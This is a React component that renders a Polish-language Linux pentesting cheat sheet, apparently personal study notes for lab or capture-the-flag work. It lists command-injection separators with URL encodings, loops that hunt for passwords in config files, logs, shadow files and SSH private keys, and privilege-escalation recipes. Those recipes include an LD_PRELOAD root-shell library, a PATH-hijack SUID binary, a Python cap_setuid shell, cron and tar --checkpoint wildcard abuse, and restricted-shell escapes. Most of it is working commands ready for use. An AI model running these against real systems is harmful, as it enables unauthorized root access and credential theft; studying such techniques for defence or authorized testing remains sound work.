import { Link } from 'react-router-dom';

const LinuxCommands = () => {

    return(
        <section>
            <h1>Linux Commands</h1>

            <details>
                <summary>(~) do nazwy</summary>
                <p>Dodanie tyldy (<span className='important'>~</span>) do nazwy pliku w systemie Linux najczęściej oznacza, że <span className='important'>jest to plik kopii zapasowej (backup)</span>. Nie jest to jednak żadna specjalna cecha systemu plików – to raczej konwencja przyjęta przez niektóre edytory tekstu i programy, np.:</p>
                <p><span className='important'>Emacs, nano, czy gedit</span> – często tworzą kopię pliku przed jego edycją i zapisują ją jako plik.txt~.</p>
                <p>Pliki z ~ na końcu są zazwyczaj kopią poprzedniego stanu pliku.</p>
            </details>

            <hr />
        

            <table>
                <thead>
                    <tr>
                    <th>Wstrzyknięte znaki</th>
                    <th>Znak w URL-Encoded</th>
                    <th>Wykonanie polecenia</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>;</code></td>
                    <td><code>%3b</code></td>
                    <td>Obydwa</td>
                    </tr>
                    <tr>
                    <td><code>\n</code></td>
                    <td><code>%0a</code></td>
                    <td>Obydwa</td>
                    </tr>
                    <tr>
                    <td><code>&amp;</code></td>
                    <td><code>%26</code></td>
                    <td>Obydwa (drugie wyjście jest zwykle pokazywane jako pierwsze)</td>
                    </tr>
                    <tr>
                    <td><code>|</code></td>
                    <td><code>%7c</code></td>
                    <td>Obydwa (pokazywane jest tylko drugie wyjście)</td>
                    </tr>
                    <tr>
                    <td><code>&amp;&amp;</code></td>
                    <td><code>%26%26</code></td>
                    <td>Obydwa (tylko jeśli pierwszy się powiedzie)</td>
                    </tr>
                    <tr>
                    <td><code>||</code></td>
                    <td><code>%7c%7c</code></td>
                    <td>Drugi (tylko jeśli pierwszy się nie powiedzie)</td>
                    </tr>
                    <tr>
                    <td><code>``</code></td>
                    <td><code>%60%60</code></td>
                    <td>Obydwa (tylko Linux)</td>
                    </tr>
                    <tr>
                    <td><code>$()</code></td>
                    <td><code>%24%28%29</code></td>
                    <td>Obydwa (tylko Linux)</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>Wskazówka: Oprócz powyższego istnieje kilka operatorów przeznaczonych tylko dla systemu Unix, które działają na Linuksie i macOS, ale nie działają na Windowsie, jak na przykład zawijanie naszego wstrzykniętego polecenia podwójnymi znakami wstecznymi (<span className='important'>``</span>) lub sub- operator powłoki (<span className='important'>$()</span>).</p>
            </div>

            <div className='waring'>
                <p>Uwaga: Jedynym wyjątkiem może być średnik ;, który nie będzie działać, jeśli polecenie zostało wykonane za pomocą wiersza poleceń systemu Windows (CMD), ale nadal będzie działać, jeśli zostanie wykonane za pomocą programu Windows PowerShell.</p>
            </div>

            <div className='waring'>
                <p><span className='important'>netstat -antp | grep -i list</span></p>
                <p>Lista otwartych lokalnie portów</p>
            </div>

            <hr />
            <h2>Credential Linux</h2>
            <div className='waring'>
                <p>for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2{`>`}/dev/null | grep -v "lib\|fonts\|share\|core" ;done</p>
                <p>for i in $(find / -name *.cnf 2{`>`}/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2{`>`}/dev/null | grep -v "\#";done</p>
                <p>for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2{`>`}/dev/null | grep -v "doc\|lib\|headers\|share\|man";done</p>
                <p>find /home/* -type f -name "*.txt" -o ! -name "*.*"</p>
                <p>for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2{`>`}/dev/null | grep -v "doc\|lib\|headers\|share";done</p>
                <p>for i in $(ls /var/log/* 2{`>`}/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2{`>`}/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2{`>`}/dev/null;fi;done</p>
            </div>
            <div className='waring'>
                <p>grep --color=auto -rnw '{`<Path>`}' -ie "{`<Looking for word>`}" --color=always 2{`>`}/dev/null</p>
            </div>

            <table>
                <thead>
                    <tr>
                    <th><strong>Komenda</strong></th>
                    <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>&nbsp;<code>ps aux | grep root</code></td>
                        <td>Wyświetal procesy roota</td>
                    </tr>
                    <tr>
                    <td><code>history</code></td>
                    <td>Sprawdza hisorię bash usera</td>
                    </tr>
                    <tr>
                        <td><code>sudo -l</code></td>
                        <td>Czy użytkownik może uruchomić cokolwiek jako inny użytkownik?</td>
                    </tr>
                    <tr>
                    <td><code>ls -la /etc/cron.daily</code></td>
                    <td>Sprawdź codzienne zadania Cron</td>
                    </tr>
                    <tr>
                    <td><code>lsblk</code></td>
                    <td>Sprawdź, czy nie są zamontowane systems/drives</td>
                    </tr>
                    <tr>
                    <td><code>uname -a</code></td>
                    <td>Sprawdź wersję jądra (Kernel)</td>
                    </tr>
                    <tr>
                    <td><code>cat /etc/lsb-release </code></td>
                    <td>Sprawdź wersję systemu operacyjnego</td>
                    </tr>
                    <tr>
                    <td><code>screen -v</code></td>
                    <td>Sprawdź zainstalowaną wersję <code>Screen</code></td>
                    </tr>
                    <tr>
                    <td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
                    <td>Znajdź pliki binarne z ustawionym bitem SUID</td>
                    </tr>
                    <tr>
                    <td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
                    <td>Znajdź pliki binarne z ustawionym bitem SETGID</td>
                    </tr>
                    <tr>
                    <td>find / -group management -exec ls -l {} \; 2{`>`}/dev/null</td>
                    <td>Znajdź pliki dla grupy managment</td>
                    </tr>
                    <tr>
                    <td><code>echo $PATH</code></td>
                    <td>Sprawdź zawartość zmiennej PATH bieżącego użytkownika</td>
                    </tr>
                    <tr>
                    <td><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2&gt;/dev/null</code></td>
                    <td>Wyszukaj pliki konfiguracyjne (conf)</td>
                    </tr>
                    <tr>      
                    <td><code>showmount -e 10.129.2.12</code></td>
                    <td>Pokaż listę eksportu NFS</td>
                    </tr>
                    <tr>
                    <td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
                    <td>Zamontuj lokalnie udział NFS</td>
                    </tr>

                </tbody>
            </table>

            <details>
                <summary>LD_PRELOAD</summary>
                <div className='waring'>
                    <p>#include {`<stdio.h>`}</p>
                    <p>#include {`<sys/types.h>`}</p>
                    <p>#include {`<stdlib.h>`}</p>
                    <br />
                    <p>void _init(){`{`}</p>
                    <p className='tab-1'>unsetenv("LD_PRELOAD");</p>
                    <p className='tab-1'>setgid(0);</p>
                    <p className='tab-1'>setuid(0);</p>
                    <p className='tab-1'>system("/bin/bash");</p>
                    <p>{`}`}</p>
                </div>
                <p>gcc -fPIC -shared -o {`<Nazwa output>`} shell.c -nostartfiles</p>
                <p>sudo LD_PRELOAD={`<Pełna lokalizacja>`} {`<Jakiś servis z sudo -l>`}</p>
            </details>

            <details>
                <summary>.c escalation</summary>
                <div className='waring'>
                    <p>echo 'int main() {`{`} setgid(0); setuid(0); system("/bin/bash"); return 0;{`}`}'</p>
                </div>
                <p>gcc /tmp/service.c -o /tmp/service</p>
                <p>export PATH=/tmp:$PATH</p>
                <p>{'<Ścieżka pliku znalezionego przez -find / -type f -perm 04000 -ls 2>/dev/null >'}</p>
            </details>

            <details>
                <summary>getcap</summary>
                <p>getcap -r / 2{'>'}/dev/null</p>
                <div className='waring'>
                    <p>/usr/bin/python2.6 = cap_setuid+ep</p>
                    <p>...</p>
                </div>
                <p>/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'</p>
            </details>

            <details>
                <summary>cron</summary>
                <p>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' {`>`} {'<Nadpisujący się plik>'}</p>
                <p>chmod +x {'<Nadpisujący się plik>'}</p>
                <br />
                <p>Po zrobienu kopii</p>
                <p>/tmp/bash -p</p>
                <br />
                <p>----------</p>
                <br />
                <p>Gdy mamy skrypt który robi backup np. <span className='important'>tar czf /tmp/backup.tar.gz *</span></p>
                <p>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' {`>`} {'<Dowolna nazwa scriptu .sh>'}</p>
                <p>chmod +x {'<Utworzonego scriptu>'}</p>
                <p>touch {`<Pełna ścieżka do forlderu wszystkich scriptów>`}/--checkpoint=1</p>
                <p>touch {`<Pełna ścieżka do forlderu wszystkich scriptów>`}/--checkpoint-action=exec=sh/{`<Utworzonego scriptu>`}</p>
                <br />
                <p>Czekamy aż cron wykona pliki</p>
                <p>/tmp/bash -p</p>
            </details>

            <details>
                <summary>Jaki jest typ dystrybucji? Jaka wersja?</summary>
                <p>cat /etc/issue</p>
                <p>cat /etc/*-release</p>
                <p>cat /etc/lsb-release      # Debian based</p>
                <p>cat /etc/redhat-release   # Redhat based</p>
            </details>
            <details>
                <summary>Jaka jest wersja jądra? Czy jest 64-bitowy?</summary>
                <p>cat /proc/version</p>
                <p>uname -a</p>
                <p>uname -mrs</p>
                <p>rpm -q kernel</p>
                <p>dmesg | grep Linux</p>
                <p>ls /boot | grep vmlinuz-</p>
            </details>
            <details>
                <summary>Czego można się dowiedzieć ze zmiennych środowiskowych?</summary>
                <p>cat /etc/profile</p>
                <p>cat /etc/bashrc</p>
                <p>cat ~/.bash_profile</p>
                <p>cat ~/.bashrc</p>
                <p>cat ~/.bash_logout</p>
                <p>env</p>
                <p>set</p>
            </details>
            <details>
                <summary>Czy jest drukarka?</summary>
                <p>lpstat -a</p>
            </details>
            <details>
                <summary>Jakie usługi są uruchomione? Która usługa ma jakie uprawnienia użytkownika?</summary>
                <p>ps aux</p>
                <p>ps -ef</p>
                <p>top</p>
                <p>cat /etc/services</p>
            </details>
            <details>
                <summary>Które usługi są uruchamiane przez roota? Spośród tych usług, które są podatne na ataki - warto dokładnie sprawdzić!</summary>
                <p>ps aux | grep root</p>
                <p>ps -ef | grep root</p>
            </details>
            <details>
                <summary>Jakie aplikacje są zainstalowane? Jaka to wersja? Czy obecnie działają?</summary>
                <p>ls -alh /usr/bin/</p>
                <p>ls -alh /sbin/</p>
                <p>dpkg -l</p>
                <p>rpm -qa</p>
                <p>ls -alh /var/cache/apt/archivesO</p>
                <p>ls -alh /var/cache/yum/</p>
            </details>
            <details>
                <summary>Któreś z ustawień usług są źle skonfigurowane? Czy są dołączone jakieś (bezpieczne) wtyczki?</summary>
                <p>cat /etc/syslog.conf</p>
                <p>cat /etc/chttp.conf</p>
                <p>cat /etc/lighttpd.conf</p>
                <p>cat /etc/cups/cupsd.conf</p>
                <p>cat /etc/inetd.conf</p>
                <p>cat /etc/apache2/apache2.conf</p>
                <p>cat /etc/my.conf</p>
                <p>cat /etc/httpd/conf/httpd.conf</p>
                <p>cat /opt/lampp/etc/httpd.conf</p>
                <p>ls -aRl /etc/ | awk '$1 ~ /^.*r.*/</p>
            </details>
            <details>
                <summary>Jakie prace są zaplanowane?</summary>
                <p>crontab -l</p>
                <p>ls -alh /var/spool/cron</p>
                <p>ls -al /etc/ | grep cron</p>
                <p>ls -al /etc/cron*</p>
                <p>cat /etc/cron*</p>
                <p>cat /etc/at.allow</p>
                <p>cat /etc/at.deny</p>
                <p>cat /etc/cron.allow</p>
                <p>cat /etc/cron.deny</p>
                <p>cat /etc/crontab</p>
                <p>cat /etc/anacrontab</p>
                <p>cat /var/spool/cron/crontabs/root</p>
            </details>
            <details>
                <summary>Jakie karty sieciowe ma system? Czy jest podłączony do innej sieci?</summary>
                <p>/sbin/ifconfig -a</p>
                <p>cat /etc/network/interfaces</p>
                <p>cat /etc/sysconfig/network</p>
            </details>
            <details>
                <summary>Jakie są ustawienia konfiguracji sieci? Czego możesz dowiedzieć się o tej sieci? Serwer DHCP? Serwer DNS? Wejście?</summary>
                <p>cat /etc/resolv.conf</p>
                <p>cat /etc/sysconfig/network</p>
                <p>cat /etc/networks</p>
                <p>iptables -L</p>
                <p>hostname</p>
                <p>dnsdomainname</p>
            </details>
            <details>
                <summary>Jacy inni użytkownicy i hosty komunikują się z systemem?</summary>
                <p>lsof -i</p>
                <p>lsof -i :80</p>
                <p>grep 80 /etc/services</p>
                <p>netstat -antup</p>
                <p>netstat -antpx</p>
                <p>nnetstat -tulpn</p>
                <p>chkconfig --list</p>
                <p>chkconfig --list | grep 3:on</p>
                <p>last</p>
                <p>w</p>
            </details>
            <details>
                <summary>Co jest zapisane w pamięci podręcznej? Adresy IP i/lub MAC</summary>
                <p>arp -e</p>
                <p>route</p>
                <p>/sbin/route -nee</p>
            </details>
            <details>
                <summary>Czy możliwe jest wąchanie pakietów? Co można zobaczyć? Słuchaj ruchu na żywo</summary>
                <p>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</p>
            </details>
            <details>
                <summary>Kim jesteś? Kto jest zalogowany? Kto się zalogował? Kto jeszcze tam jest? Kto może co zrobić?</summary>
                <p>id</p>
                <p>who</p>
                <p>w</p>
                <p>last</p>
                <p>cat /etc/passwd | cut -d: -f1    # List of users</p>
                <p>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 {`{ print $1}`}'   # List of super users</p>
                <p>awk -F: '($3 == "0") {`{print}`}' /etc/passwd   # List of super users</p>
                <p>cat /etc/sudoers</p>
                <p>sudo -l</p>
            </details>
            <details>
                <summary>Jakie wrażliwe pliki można znaleźć?</summary>
                <p>cat /etc/passwd</p>
                <p>cat /etc/group</p>
                <p>cat /etc/shadow</p>
                <p>ls -alh /var/mail/</p>
            </details>
            <details>
                <summary>Czy są jakieś hasła; skrypty, bazy danych, pliki konfiguracyjne lub pliki dziennika? Domyślne ścieżki i lokalizacje haseł</summary>
                <p>cat /var/apache2/config.inc</p>
                <p>cat /var/lib/mysql/mysql/user.MYD</p>
                <p>cat /root/anaconda-ks.cfg</p>
            </details>
            <details>
                <summary>Co robi użytkownik? Czy jest jakieś hasło zapisane zwykłym tekstem? Co redagowali?</summary>
                <p>cat ~/.bash_history</p>
                <p>cat ~/.nano_history</p>
                <p>cat ~/.atftp_history</p>
                <p>cat ~/.mysql_history</p>
                <p>cat ~/.php_history</p>
            </details>
            <details>
                <summary>Jakie informacje o użytkowniku można znaleźć?</summary>
                <p>cat ~/.bashrc</p>
                <p>cat ~/.profile</p>
                <p>cat /var/mail/root</p>
                <p>cat /var/spool/mail/root</p>
            </details>
            <details>
                <summary>Czy można znaleźć informacje o kluczu prywatnym?</summary>
                <p>cat ~/.ssh/authorized_keys</p>
                <p>cat ~/.ssh/identity.pub</p>
                <p>cat ~/.ssh/identity</p>
                <p>cat ~/.ssh/id_rsa.pub</p>
                <p>cat ~/.ssh/id_rsa</p>
                <p>cat ~/.ssh/id_dsa.pub</p>
                <p>cat ~/.ssh/id_dsa</p>
                <p>cat /etc/ssh/ssh_config</p>
                <p>cat /etc/ssh/sshd_config</p>
                <p>cat /etc/ssh/ssh_host_dsa_key.pub</p>
                <p>cat /etc/ssh/ssh_host_dsa_key</p>
                <p>cat /etc/ssh/ssh_host_rsa_key.pub</p>
                <p>cat /etc/ssh/ssh_host_rsa_key</p>
                <p>cat /etc/ssh/ssh_host_key.pub</p>
                <p>cat /etc/ssh/ssh_host_key</p>
            </details>
            <details>
                <summary>Jakie pliki konfiguracyjne można zapisać w /etc/? Czy możesz ponownie skonfigurować usługę?</summary>
                <p>ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2{`>`}/dev/null     # Anyone</p>
                <p>ls -aRl /etc/ | awk '$1 ~ /^..w/' 2{`>`}/dev/null       # Owner</p>
                <p>ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2{`>`}/dev/null    # Group</p>
                <p>ls -aRl /etc/ | awk '$1 ~ /w.$/' 2{`>`}/dev/null        # Other</p>
                <p>find /etc/ -readable -type f 2{`>`}/dev/null               # Anyone</p>
                <p>find /etc/ -readable -type f -maxdepth 1 2{`>`}/dev/null   # Anyone</p>
            </details>
            <details>
                <summary>Co można znaleźć w /var/?</summary>
                <p>ls -alh /var/log</p>
                <p>ls -alh /var/mail</p>
                <p>ls -alh /var/spool</p>
                <p>ls -alh /var/spool/lpd</p>
                <p>ls -alh /var/lib/pgsql</p>
                <p>ls -alh /var/lib/mysql</p>
                <p>cat /var/lib/dhcp3/dhclient.leases</p>
            </details>
            <details>
                <summary>Jakieś ustawienia/pliki (ukryte) na stronie? Jakiś plik ustawień z informacjami o bazie danych?</summary>
                <p>ls -alhR /var/www/</p>
                <p>ls -alhR /srv/www/htdocs/</p>
                <p>ls -alhR /usr/local/www/apache22/data/</p>
                <p>ls -alhR /opt/lampp/htdocs/</p>
                <p>ls -alhR /var/www/html/</p>
            </details>
            <details>
                <summary>Czy jest coś w plikach dziennika (może pomóc w przypadku „Zawierania pliku lokalnego”!)</summary>
                <p>cat /etc/httpd/logs/access_log</p>
                <p>cat /etc/httpd/logs/access.log</p>
                <p>cat /etc/httpd/logs/error_log</p>
                <p>cat /etc/httpd/logs/error.log</p>
                <p>cat /var/log/apache2/access_log</p>
                <p>cat /var/log/apache2/access.log</p>
                <p>cat /var/log/apache2/error_log</p>
                <p>cat /var/log/apache2/error.log</p>
                <p>cat /var/log/apache/access_log</p>
                <p>cat /var/log/apache/access.log</p>
                <p>cat /var/log/auth.log</p>
                <p>cat /var/log/chttp.log</p>
                <p>cat /var/log/cups/error_log</p>
                <p>cat /var/log/dpkg.log</p>
                <p>cat /var/log/faillog</p>
                <p>cat /var/log/httpd/access_log</p>
                <p>cat /var/log/httpd/access.log</p>
                <p>cat /var/log/httpd/error_log</p>
                <p>cat /var/log/httpd/error.log</p>
                <p>cat /var/log/lastlog</p>
                <p>cat /var/log/lighttpd/access.log</p>
                <p>cat /var/log/lighttpd/error.log</p>
                <p>cat /var/log/lighttpd/lighttpd.access.log</p>
                <p>cat /var/log/lighttpd/lighttpd.error.log</p>
                <p>cat /var/log/messages</p>
                <p>cat /var/log/secure</p>
                <p>cat /var/log/syslog</p>
                <p>cat /var/log/wtmp</p>
                <p>cat /var/log/xferlog</p>
                <p>cat /var/log/yum.log</p>
                <p>cat /var/run/utmp</p>
                <p>cat /var/webmin/miniserv.log</p>
                <p>cat /var/www/logs/access_log</p>
                <p>cat /var/www/logs/access.log</p>
                <p>ls -alh /var/lib/dhcp3/</p>
                <p>ls -alh /var/log/postgresql/</p>
                <p>ls -alh /var/log/proftpd/</p>
                <p>ls -alh /var/log/samba/</p>
            </details>
            <details>
                <summary>Jeśli polecenia są ograniczone, wyrywasz się z „więzienia”?</summary>
                <p>python -c 'import pty;pty.spawn("/bin/bash")'</p>
                <p>echo os.system('/bin/bash')</p>
                <p>/bin/sh -i</p>
            </details>
            <details>
                <summary>Jak montowane są systemy plików?</summary>
                <p>mount</p>
                <p>df -h</p>
            </details>
            <details>
                <summary>Czy są jakieś niezamontowane systemy plików?</summary>
                <p>cat /etc/fstab</p>
            </details>
            <details>
                <summary>Jakie są używane „zaawansowane uprawnienia do plików systemu Linux”? Lepkie bity, SUID i GUID</summary>
                <p>find / -perm -1000 -type d 2{`>`}/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</p>
                <p>find / -perm -g=s -type f 2{`>`}/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</p>
                <p>find / -perm -u=s -type f 2{`>`}/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</p>
                <p>find / -perm -g=s -o -perm -u=s -type f 2{`>`}/dev/null    # SGID or SUID</p>
                <p>for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2{`>`}/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</p>
                <p># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</p>
                <p>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2{`>`}/dev/null</p>
            </details>
            <details>
                <summary>Gdzie można zapisywać i skąd wykonywać? Kilka „typowych” miejsc: /tmp, /var/tmp, /dev/shm</summary>
                <p>find / -writable -type d 2{`>`}/dev/null      # world-writeable folders</p>
                <p>find / -perm -222 -type d 2{`>`}/dev/null     # world-writeable folders</p>
                <p>find / -perm -o w -type d 2{`>`}/dev/null     # world-writeable folders</p>
                <p>find / -perm -o x -type d 2{`>`}/dev/null     # world-executable folders</p>
                <p>find / \( -perm -o w -perm -o x \) -type d 2{`>`}/dev/null   # world-writeable & executable folders</p>
            </details>
            <details>
                <summary>Jakieś „problematyczne” pliki? Pliki „nikt” z możliwością zapisu w programie Word</summary>
                <p>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files</p>
                <p>find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</p>
            </details>
        </section>
    )
};

export default LinuxCommands;